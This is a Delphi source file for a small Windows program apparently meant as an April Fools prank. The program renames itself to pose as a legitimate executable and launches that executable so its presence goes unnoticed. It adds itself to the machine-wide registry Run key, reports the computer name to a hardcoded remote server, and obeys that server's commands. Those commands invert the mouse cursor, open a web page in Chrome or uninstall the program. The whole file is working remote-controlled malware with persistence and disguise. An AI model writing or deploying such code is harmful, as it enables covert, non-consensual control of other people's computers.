program mreverse;

uses
  windows,
  IdTCPClient,
  System.SysUtils,
  Vcl.Forms,
  Registry;

var
  client: TIdTCPClient;
  current_filename: string;
  current_dir: string;
  MousePos, NewMousePos: TPoint;
  ToBegin: Boolean;
  autorun_path: string;
  ms_to_connect:Integer;
  CloseProcess:Boolean;
  parameters:string;
  StartUpInfo: TStartUpInfo;
  ProcessInfo: TProcessInformation;
  url_com_recive:Boolean;
  i:Integer;

function GetComputerNName: string;
var
  buffer: array[0..255] of Char;
  Size: DWORD;
begin
  Size := 256;
  if GetComputerName(buffer, Size) then
    Result := buffer
  else
    Result := 'wat'
end;

procedure AddToAutorun(path: string; del: boolean = false);
var
  Reg: TRegistry;
begin
  reg := TRegistry.Create(KEY_ALL_ACCESS or KEY_WOW64_64KEY);
  try
    reg.RootKey := HKEY_LOCAL_MACHINE;
    reg.lazywrite := false;
    reg.openkey('software\microsoft\windows\currentversion\run', false);
    if (del) then
      reg.DeleteValue('1apr')
    else
      reg.WriteString('1apr', path);
    reg.closekey;
  finally
    reg.Free;
  end;
end;

procedure reverse_mouse();
begin
  if (NOT ToBegin) then Exit;

  GetCursorPos(NewMousePos);
  if MousePos.Y <= 0 then MousePos.Y := NewMousePos.Y + 1;
  if MousePos.X <= 0 then MousePos.X := NewMousePos.X + 1;
  NewMousePos.Y := MousePos.Y - (NewMousePos.Y - MousePos.Y);
  NewMousePos.X := MousePos.X - (NewMousePos.X - MousePos.X);
  SetCursorPos(NewMousePos.X, NewMousePos.Y);
  MousePos := NewMousePos;
end;

procedure connect_to_server();
 var answer: string;
begin
  if (ms_to_connect < 1000) then Exit;

  ms_to_connect := 0;
  try
     try
      if not client.Connected then
        client.Connect;
      if client.Connected then
      begin
        client.Socket.WriteLn(GetComputerNName);
        answer := client.Socket.ReadLn();
        if (answer = 'stop') then
          ToBegin := False;
        if (answer = 'run') or (answer = 'go') then
          ToBegin := True;
        if (answer = 'delete') or (answer = 'exit') then
          begin
           AddToAutorun(autorun_path, true);
           CloseProcess := True;
          end;
        if (answer = 'url') then
          begin
           if (not url_com_recive) then
           try
            url_com_recive := True;
            if FileExists('c:\Program Files (x86)\Google\Chrome\Application\chrome.exe') then
              CreateProcess('c:\Program Files (x86)\Google\Chrome\Application\chrome.exe','--new-window http://192.168.1.3/t.php',nil,nil,false,NORMAL_PRIORITY_CLASS,nil,nil,StartUpInfo,ProcessInfo);
           except
           end;
          end else url_com_recive:=false;
      end
       except
     end;
    finally
      client.Disconnect;
    end;
end;

begin
  CloseProcess:=false;
  parameters:='';
  // ParamCount>0 then for i:=0 to ParamCount-1 do parameters := parameters+ParamStr(i)+' ';;
  url_com_recive:=false;
  ms_to_connect:=0;
  client := TIdTCPClient.Create();
  client.Host := '192.168.1.10';
  client.Port := 55555;
  client.ReadTimeout := 3000;

  current_filename := ExtractFileName(Application.ExeName);
  current_dir := ExtractFileDir(Application.ExeName) + '\';

  if (FileExists(current_dir + copy(current_filename, 1, Length(current_filename) - 4) + '_.exe')) then
  begin
    CreateProcess(PChar(current_dir + copy(current_filename, 1, Length(current_filename) - 4) + '_.exe'),PChar(parameters),nil,nil,false,NORMAL_PRIORITY_CLASS,nil,nil,StartUpInfo,ProcessInfo);
    RenameFile(current_dir + current_filename, current_dir+'mreverse.exe');
    RenameFile(current_dir + copy(current_filename, 1, Length(current_filename) - 4) + '_.exe', current_dir + current_filename);
    current_filename := 'mreverse.exe';
  end;

  autorun_path := current_dir+current_filename;

  if GetComputerNName <> 'ADMIN' then AddToAutorun(autorun_path);
  ToBegin := false;
  GetCursorPos(MousePos);

  while NOT CloseProcess do
  begin
    connect_to_server();
    reverse_mouse();
    ms_to_connect:= ms_to_connect+1;
    Sleep(1);
  end;
end.

